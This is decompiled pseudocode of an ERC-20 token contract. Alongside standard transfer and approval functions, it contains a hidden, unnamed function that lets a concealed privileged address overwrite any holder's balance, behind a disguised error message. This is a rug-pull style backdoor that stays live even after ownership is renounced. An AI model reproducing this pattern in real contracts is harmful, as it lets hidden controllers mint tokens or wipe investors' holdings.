contract main {




// =====================  Runtime code  =====================


address owner;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
uint256 totalSupply;
mapping of uint8 stor6;
address stor7;
mapping of uint256 balances;
mapping of uint256 allowed;

function name() payable {
    return name[0 len name.length]
}

function allowAddress(address arg1) payable {
    require calldata.size - 4 >= 32
    return bool(stor6[arg1])
}

function totalSupply() payable {
    return totalSupply
}

function balances(address arg1) payable {
    require calldata.size - 4 >= 32
    return balances[arg1]
}

function decimals() payable {
    return decimals
}

function allowed(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowed[arg1][arg2]
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balances[address(arg1)]
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowed[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    allowed[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function sub_d551d7fe(?) payable {
    require calldata.size - 4 >= 64
    if stor7 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0xfe45524332303a2063616e6e6f74207065726d69742050616e63616b6520616464726573,
                    mem[200 len 28]
    balances[address(arg1)] = arg2 * 10^decimals
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1
    require arg2 <= balances[address(msg.sender)]
    if stor6[address(msg.sender)]:
        require arg2 <= balances[address(msg.sender)]
        balances[address(msg.sender)] -= arg2
        require balances[address(arg1)] + arg2 >= balances[address(arg1)]
        balances[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
        return 1
    else:
        if not stor6[address(arg1)]:
            require arg2 <= balances[address(msg.sender)]
            balances[address(msg.sender)] -= arg2
            require balances[address(arg1)] + arg2 >= balances[address(arg1)]
            balances[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
            return 1
        else:
            require arg2 <= balances[address(msg.sender)]
            balances[address(msg.sender)] -= arg2
            require balances[address(arg1)] + arg2 >= balances[address(arg1)]
            balances[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
            return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg2
    require arg3 <= balances[address(arg1)]
    require arg3 <= allowed[address(arg1)][address(msg.sender)]
    if stor6[address(arg1)]:
        require arg3 <= balances[address(arg1)]
        balances[address(arg1)] -= arg3
        require balances[address(arg2)] + arg3 >= balances[address(arg2)]
        balances[address(arg2)] += arg3
        require arg3 <= allowed[address(arg1)][address(msg.sender)]
        allowed[address(arg1)][address(msg.sender)] -= arg3
        emit Transfer(arg3, arg1, arg2);
        return 1
    else:
        if not stor6[address(arg2)]:
            require arg3 <= balances[address(arg1)]
            balances[address(arg1)] -= arg3
            require balances[address(arg2)] + arg3 >= balances[address(arg2)]
            balances[address(arg2)] += arg3
            require arg3 <= allowed[address(arg1)][address(msg.sender)]
            allowed[address(arg1)][address(msg.sender)] -= arg3
            emit Transfer(arg3, arg1, arg2);
            return 1
        else:
            require arg3 <= balances[address(arg1)]
            balances[address(arg1)] -= arg3
            require balances[address(arg2)] + arg3 >= balances[address(arg2)]
            balances[address(arg2)] += arg3
            require arg3 <= allowed[address(arg1)][address(msg.sender)]
            allowed[address(arg1)][address(msg.sender)] -= arg3
            emit Transfer(arg3, arg1, arg2);
            return 1
}



}
